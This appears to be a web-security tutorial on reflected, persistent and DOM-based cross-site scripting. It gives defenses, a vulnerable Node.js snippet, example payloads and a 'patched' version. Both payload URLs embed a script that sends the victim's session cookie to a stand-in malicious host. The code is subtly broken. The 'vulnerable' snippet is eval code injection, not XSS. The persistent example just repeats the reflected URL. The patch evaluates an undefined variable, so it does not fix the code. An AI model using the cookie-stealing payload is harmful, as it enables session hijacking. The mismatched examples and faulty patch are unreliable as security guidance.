## XSS reflected

Cross-site Scripting is one of the most common application-layer web attacks. In XSS attacks, the victim is the user rather than the application. XSS attacks target client-side scripting languages such as HTML and JavaScript to embed a malicious script in a web page. These attacks can execute every time the page is loaded into a user’s browser or whenever an associated action is performed by the user.

Potential outcomes of XSS attacks include browser session hijacking, stealing account credentials, displaying unwanted advertisements, and infecting the user with a virus or other malware. However, the most malevolent XSS attacks complete their dirty work in secret, accessing unrelated web applications and resources behind the victim’s firewall. XSS vulnerabilities in software are easily preventable, yet most companies don’t take measures to protect their users.

There are three different types of Cross-site Scripting attacks:

**Reflective** – When interacting with a typical web application, the user will send a web request to the server, such as submitting a form. The application then responds with a page containing an echo of what the user has submitted for confirmation. Web apps with XSS vulnerabilities allow potentially harmful data to be inserted during this routine transaction. A malicious string of Javascript can replace or append itself to the user’s entry, which the user’s browser sees and executes when returned. A reflective XSS attacker entices the victim into initiating the HTTP request by clicking on a malicious link embedded in an email or a counterfeit web page that appears legitimate.

**Persistent** – Persistent XSS exploits can occur when a web application stores user- generated data and sends it back to the user’s browser without properly securing it. This kind of XSS attack is more dangerous since the attacker doesn’t have to entice users into performing any suspicious actions. If user data is not properly sanitized before being displayed in the client browser, then any user of the application can potentially become a victim.

**DOM-based** – XSS attacks can exploit the Document Object Model standard that enables API access to the content of HTML and XML documents. Many applications rely on pages that contain client-side scripts that dynamically generate HTML content. Based on certain user input, these pages modify their HTML without any interaction with the server, typically using Java or ActiveX. An XSS attacker has employed DOM-based XSS methodology if a malicious script can be injected into such a page without any data being submitted to the server. Unlike the other XSS techniques, in DOM-based exploits the client-side script is responsible for not properly sanitizing user input rather than the server.


### Defenses
It is very simple to avoid having Cross-site Scripting (XSS) vulnerabilities in your code. These fixes lock down the process of passing necessary data between a web application and the user’s browser. They can be employed with any kind of programming language and any type of database. Refer to these basic methods for identifying and preventing XSS errors in web applications.

-  Validate data input from user browsers to the web application. Developers can prevent reflective Cross-site Scripting vulnerabilities by sanitizing user- inputted data in an HTTP request before reflecting it back. Malicious code is commonly inserted as part of a GET or POST parameter. Be sure to sanitize all input from search fields and forms and convert all user input to a single character encoding before parsing. This applies to Single/Double Hex Encoding, Unicode Encoding, and UTF-8 Parsing.
- Encode all output to user browsers from the web application. Make sure all data is validated, filtered, or escaped before echoing back to the user, such as the values of query parameters during searches. Use the appropriate escaping method for the application’s context. HTML encode all user input returned as part of HTML. URL encode all user input returned as part of URLs. Convert special characters such as ?, &, /, <, >, and spaces to their respective HTML or URL encoded equivalents.
- Never trust user-submitted data. Some web applications are written to optionally operate without client-side processing at all. This is a development tradeoff which can reduce application functionality or responsiveness. Alternatively, developers can take advantage of common browser plugins that allow users to disable client-side scripts entirely, or instead give the user the option of enabling them within specific applications. When implemented, even potentially malicious scripts could be injected on a page but the user would not be susceptible.

### Vulnerable Code View
**Node.js**

```
'use strict';

var express = require('express');
var bodyParser = require('body-parser'); 
var app = express();

app.get('/', function(req, res){ 
  var form = '' +
  '<form method="POST" action="/evaluate">' +
  '<input type="text" name="f" placeholder="" />' + 
  '<input type="submit" value="Evaluate" />' + 
  '</form>';
  res.send(form);
});

app.use(bodyParser.urlencoded({extended: false}));

app.post('/evaluate', function (req, res) { 
  var result;
  eval('result = ' + req.body.f); // <-- supplied data derived from a parameter value is evaluated here.
  res.send('The result is: ' + result); 
});

app.listen(3000);
```

**Reflective XSS**

This XSS JavaScript example is delivered to the user through clicking on a malicious link. The XSS request is initiated from the victim’s browser, sent to the vulnerable web application, and then reflected back to execute in the context of the user's session.

```
http://www.bigsafebank~~~/search.asp?q=<script>x=new Image;x.src =http://malicious-domain~~~/hijackedsession.php?session-cookie=+document.cookie;</script>
```

**Persistent XSS**

This XSS Javascript example is inputted as part of the attacker’s user name. Here a fraudulent user exploits the fact that the web application stores each user name in a local database that fails to sanitize the name field, leaving it open to XSS attacks. When other users view the attacker’s profile page, the code executes in the context of their session.

```
http://www.bigsafebank.com/search.asp?q=<script>x=new Image;x.src = http://maliciousdomain~~~/hijackedsession.php?sessioncookie="+document.cookie;</script>
```


### Patched Code
```
app.post('/evaluate', function (req, res) {
  var formula = req.body.formula;
  if(formula.match(/[^0-9\-\/\*\+]/)) { // <-- a RegEx to match anything that isn't "0-9", "-", "*", "+", "/"
    res.status(400).send('Bad Input');
    return; 
  }
  var result;
  eval('result = ' + f); 
  res.send('The result is: ' + result);
});
```

### Exploit Code
```
// ...
```